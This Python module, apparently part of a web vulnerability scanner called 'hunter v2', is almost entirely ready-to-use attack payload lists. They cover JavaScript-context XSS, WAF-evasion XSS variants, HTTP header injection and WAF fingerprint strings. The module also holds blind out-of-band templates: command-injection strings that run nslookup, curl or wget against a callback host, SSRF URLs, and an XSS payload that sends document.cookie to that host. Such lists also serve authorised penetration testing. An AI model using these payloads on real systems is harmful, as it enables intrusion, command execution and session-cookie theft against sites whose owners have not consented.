"""hunter v2 extensions — JS-context, header injection, blind OOB, JSON body."""
from typing import List

# ======================================================== JS-context XSS
JS_CONTEXT_XSS_PAYLOADS: List[str] = [
    "';alert(1);//",
    "\";alert(1);//",
    "1;alert(1);var x='",
    "1;alert(1);var x=\"",
    "1);alert(1);//",
    "1};alert(1);//",
    "1-eval('ale'+'rt(1)')",
    "1;top['al'+'ert'](1);var x='",
    "1;Function('al'+'ert(1)')()",
    "</script><script>alert(1)</script>",
    "\\';alert(1);//",
    "\\\";alert(1);//",
]

JS_CONTEXT_MARKERS: List[str] = [
    ";alert(1);//",
    "1;alert(1)",
    "eval('ale'+'rt(1)')",
    "top['al'+'ert'](1)",
    "Function('al'+'ert(1)')",
    "</script><script>alert(1)</script>",
]

# ======================================================== WAF evasion XSS
WAF_EVASION_XSS: List[str] = [
    "<ScRiPt>alert(1)</ScRiPt>",
    "<sCrIpT>alert(1)</sCrIpT>",
    "<script\x0b>alert(1)</script>",
    "<script\t>alert(1)</script>",
    "<script\n>alert(1)</script>",
    "<script/ >alert(1)</script>",
    "&#60;script&#62;alert(1)&#60;/script&#62;",
    "%3Cscript%3Ealert(1)%3C/script%3E",
    "<scr<script>ipt>alert(1)</script>",
    "<svg onload=alert(1)>",
    "<svg/onload=alert(1)>",
    "<img src=x onerror=alert(1)>",
]

# ======================================================== header injection
HEADER_INJECTION_POINTS: List[str] = [
    "Referer",
    "User-Agent",
    "X-Forwarded-For",
    "X-Real-IP",
    "X-Client-IP",
    "X-Originating-IP",
    "X-Remote-Addr",
    "True-Client-IP",
    "CF-Connecting-IP",
    "Forwarded",
    "X-Forwarded-Host",
    "Origin",
]

HEADER_INJECT_PAYLOADS: List[str] = [
    "<script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "';alert(1);//",
    "1;alert(1);var x='",
    "<svg onload=alert(1)>",
]

# ======================================================== JSON body fields
JSON_INJECT_FIELDS: List[str] = [
    "q", "search", "query", "id", "name", "user", "username",
    "file", "url", "path", "cmd", "command", "message", "email",
    "input", "value", "data", "content", "text", "code",
]

# ======================================================== WAF detection
WAF_SIGNATURES: List[str] = [
    r"cf-ray", r"cloudflare", r"attention required",
    r"mod_security", r"modsecurity", r"not acceptable",
    r"akamai", r"incapsula", r"sucuri", r"imperva",
    r"request blocked", r"security check", r"challenge platform",
    r"your request has been blocked",
    r"the requested url was rejected",
]

# ======================================================== blind templates
BLIND_CMDI_TEMPLATES: List[str] = [
    "; nslookup {tok}.oob",
    "| nslookup {tok}.oob",
    "|| nslookup {tok}.oob",
    "& nslookup {tok}.oob",
    "&& nslookup {tok}.oob",
    "$(nslookup {tok}.oob)",
    "`nslookup {tok}.oob`",
    "; curl {cb}/cmdi-{tok}",
    "; wget -q -O- {cb}/cmdi-{tok}",
    "| curl {cb}/cmdi-{tok}",
]

BLIND_SSRF_TEMPLATES: List[str] = [
    "http://{cb}/ssrf-{tok}",
    "https://{cb}/ssrf-{tok}",
    "//{cb}/ssrf-{tok}",
    "http://127.0.0.1@{cb}/ssrf-{tok}",
]

BLIND_XSS_TEMPLATES: List[str] = [
    "<script src=//{cb}/xss-{tok}></script>",
    "<img src=//{cb}/xss-{tok}>",
    "<svg onload=\"new Image().src='//{cb}/xss-{tok}?c='+document.cookie\">",
]
